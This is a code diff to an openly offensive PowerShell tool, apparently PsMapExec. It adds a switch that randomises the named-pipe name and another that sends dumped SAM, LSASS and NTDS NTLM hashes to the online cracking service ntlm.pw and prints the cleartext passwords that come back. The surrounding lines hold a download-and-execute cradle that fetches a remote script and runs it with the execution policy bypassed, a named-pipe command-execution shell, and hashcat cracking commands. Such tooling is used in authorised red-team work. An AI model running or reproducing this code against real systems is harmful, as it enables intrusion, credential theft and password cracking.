@@ -82,7 +82,13 @@ Param(
     [int]$Timeout = 3000,
 
     [Parameter(Mandatory=$False, ValueFromPipeline=$true)]
-    [switch]$Flush
+    [switch]$Flush,
+
+    [Parameter(Mandatory=$False, ValueFromPipeline=$true)]
+    [switch]$Scramble,
+
+    [Parameter(Mandatory=$False, ValueFromPipeline=$true)]
+    [switch]$Rainbow
 )
 
 # Check for mandatory parameter
@@ -708,12 +714,13 @@ if ($Module -eq "Amnesiac") {
         
         if ($CurrentUser) {
             Write-Verbose "Starting Amnesiac without impersonation"
-            $process = Start-Process powershell.exe -ArgumentList "-ep bypass -c `"IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Leo4j/Amnesiac/main/Amnesiac.ps1'); Amnesiac -ScanMode -GlobalPipeName $PN`"" -PassThru
+            $process = Start-Process cmd.exe -ArgumentList "/c powershell.exe -ep bypass -c `"IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Leo4j/Amnesiac/main/Amnesiac.ps1'); Amnesiac -ScanMode -GlobalPipeName $PN`"" -PassThru
             $Global:AmnesiacPID = $process.Id
         }
     } else {
         Write-Verbose "Amnesiac is already running"
-        if ((Get-Process -Id $Global:AmnesiacPID -ErrorAction SilentlyContinue) -ne $null) {
+        if ($Scramble){$Global:PN = ((65..90) + (97..122) | Get-Random -Count 16 | ForEach-Object { [char]$_ }) -join ''}
+        elseif ((Get-Process -Id $Global:AmnesiacPID -ErrorAction SilentlyContinue) -ne $null) {
             $Global:PN = $Global:PN
         } else {
             $Global:AmnesiacPID = $null
@@ -1452,11 +1459,23 @@ $Command = "powershell.exe -ep bypass -enc $base64command"
 
 # Amnesiac
 if ($Module -eq "Amnesiac"){
+
 Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
 Write-Host "Amnesiac PID: $Global:AmnesiacPID"
 
 Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
 Write-Host "PipeName: $Global:PN"
+
+if ($Scramble){
+
+Write-Host ""
+Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
+Write-Host "The switch Scramble is in use. Ensure Amnesiac is already running"
+
+Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
+Write-Host "In Amnesiac do ""GLset $Global:PN"" then hit option ""3"""
+    
+}
 
 $SID = $Global:SID
 $ServerScript="`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"$SID`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',1028,1028,`$sd);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"#END#`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose();exit"
@@ -5192,6 +5211,145 @@ function AdminCount {
 }
 
 ################################################################################################################
+############################################ Function: RainbowCheck ############################################
+################################################################################################################
+
+Function RainbowCheck {
+param ($Module, $RCFilePath)
+
+    if (-not (Test-Path -Path $RCFilePath)) {
+        Write-Warning "The file at '$RCFilePath' does not exist."
+        return
+    }
+
+    if (!(Get-Content -Path $RCFilePath)) {
+        Write-Warning "The file at '$RCFilePath' is empty."
+        return
+    }
+
+function Rainbow-SAM {
+    $hashEntries = Get-Content -Path $RCFilePath | ForEach-Object {
+        if ($_ -match "^\[(.+?)\](.+?):\d*?:[a-f0-9A-F]{32}:([a-f0-9A-F]{32}).*?$") {
+            $hostname = $matches[1] -replace '^\[|\]$', ''  # Remove brackets from the hostname
+            $username = $matches[2]
+            $ntHash = $matches[3]
+            New-Object PSObject -Property @{
+                Hostname = $hostname
+                Username = $username
+                NTHash = $ntHash
+            }
+        }
+    }
+    return $hashEntries
+}
+
+function Rainbow-LogonPasswords {
+    $hashEntries = Get-Content -Path $RCFilePath | ForEach-Object {
+        if ($_ -match "^(.+?)\\(.+?):([a-f0-9A-F]{32})$") {
+            $domain = $matches[1]
+            $username = $matches[2]
+            $ntHash = $matches[3]
+            New-Object PSObject -Property @{
+                Domain = $domain
+                Username = $username
+                NTHash = $ntHash
+            }
+        }
+    }
+    return $hashEntries
+}
+
+function Rainbow-NTDS {
+    $hashEntries = Get-Content -Path $RCFilePath | ForEach-Object {
+        if ($_ -match "^(.+?):\d*?:[a-f0-9A-F]{32}:([a-f0-9A-F]{32}).*?$") {
+            $username = $matches[1]
+            $ntHash = $matches[2]
+            New-Object PSObject -Property @{
+                Username = $username
+                NTHash = $ntHash
+            }
+        }
+    }
+    return $hashEntries
+}
+
+
+$NTLMpwURL = "https://ntlm.pw/" 
+
+$parsedData = switch ($Module) {
+    "SAM" { Rainbow-SAM -FilePath $RCFilePath }
+    "LogonPasswords" { Rainbow-LogonPasswords -FilePath $RCFilePath }
+    "NTDS" { Rainbow-NTDS -FilePath $RCFilePath }
+}
+
+# Group users by their NTLM hash
+$groupedHashEntries = $parsedData | Group-Object NTHash
+
+# Construct the POST request body with the NT hashes (unique hashes only)
+$hashesBody = ($groupedHashEntries.Name -join "%0D%0A")
+
+# Send a POST request to the server
+$response = Invoke-WebRequest -Uri $NTLMpwURL -Method Post -Body "hashes=$hashesBody" -ContentType "application/x-www-form-urlencoded" -UseBasicParsing
+
+if ($response.StatusCode -eq 200) {
+    $htmlContent = $response.Content
+
+    $pattern = "<tr><td class=`"font-monospace`">(.+?)</td><td>(.+?)</td></tr>"
+    $matches = Select-String -InputObject $htmlContent -Pattern $pattern -AllMatches
+
+    $results = $matches.Matches | ForEach-Object {
+        $hash = $_.Groups[1].Value
+        $password = $_.Groups[2].Value
+
+        if ($password -ne "[not found]") {
+            $groupedHashEntries | Where-Object { $_.Name -eq $hash } | ForEach-Object {
+                $_.Group | ForEach-Object {
+                    New-Object -TypeName PSObject -Property @{
+                        Hostname = $_.Hostname
+                        Domain = $_.Domain
+                        Username = $_.Username
+                        Hash = $hash
+                        Password = $password
+                    }
+                }
+            }
+        }
+    }
+
+Write-Host
+Write-Host
+
+Write-host "[*] " -ForegroundColor "Yellow" -NoNewline
+Write-Host "Checking collected hashes against an online rainbow table"
+
+Write-host "[*] " -ForegroundColor "Yellow" -NoNewline
+Write-Host "Only values for which the password is known will be shown"
+
+Write-host "[*] " -ForegroundColor "Yellow" -NoNewline
+Write-Host "URL: $NTLMpwURL"
+
+Write-Host
+
+switch ($Module) {
+    "SAM" {
+        $sortedResults = $results | Sort-Object Hostname
+        $sortedResults | Format-Table -Property Hostname, Username, Hash, Password -AutoSize
+    }
+    "LogonPasswords" {
+        $sortedResults = $results | Sort-Object Username
+        $sortedResults | Format-Table -Property Domain, Username, Hash, Password -AutoSize
+    }
+    "NTDS" {
+        $sortedResults = $results | Sort-Object Username
+        $sortedResults | Format-Table -Property Username, Hash, Password -AutoSize
+    }
+}
+} 
+elseif ($response.StatusCode -eq 429){Write-Warning "Quota Exceeded on lookup"}
+else {Write-Warning "Error communicating with $NTLMpwURL" }
+}
+
+################################################################################################################
 ################################################## Function: Parse-SAM #########################################
 ################################################################################################################
 function Parse-SAM {
@@ -5267,6 +5425,10 @@ function Parse-SAM {
     Write-Host ""
     Write-Host "All SAM hashes written to $PME\SAM\.Sam-Full.txt" -ForegroundColor "Yellow"
     Write-Host ""
+    
+    if ($Rainbow){
+    RainbowCheck -Module "SAM" -RCFilePath "$PME\SAM\.Sam-Full.txt"
+    }
 }
 
 
@@ -5284,6 +5446,7 @@ function Parse-LogonPasswords {
         param (
             [string]$raw
         )
+
 
         $userInfo = @{}
 
@@ -5452,6 +5615,11 @@ function Parse-LogonPasswords {
     Write-Host "hashcat -a 0 -m 1000 -O --username Hashes.txt Wordlist.txt"
     Write-Host "Show cracked NTLMs: " -NoNewline -ForegroundColor "Yellow"
     Write-Host "hashcat -m 1000 Hashes.txt --username --show --outfile-format 2"
+    Write-Host
+
+    if ($Rainbow){
+    RainbowCheck -Module "LogonPasswords" -RCFilePath "$LogonPasswords\.AllUniqueNTLM.txt"
+    }
 }
 
 
@@ -5811,9 +5979,13 @@ Function Parse-NTDS {
     Write-Output ""
     Write-host "[*] " -ForegroundColor "Yellow" -NoNewline
     Write-host "Parsed NTDS files stored in $newDirectoryPath"
+
+    if ($Rainbow){
+    RainbowCheck -Module "NTDS" -RCFilePath (Join-Path $newDirectoryPath "UserHashes.txt")
+
+    }
+
 }
-
-
 
 
 ################################################################################################################
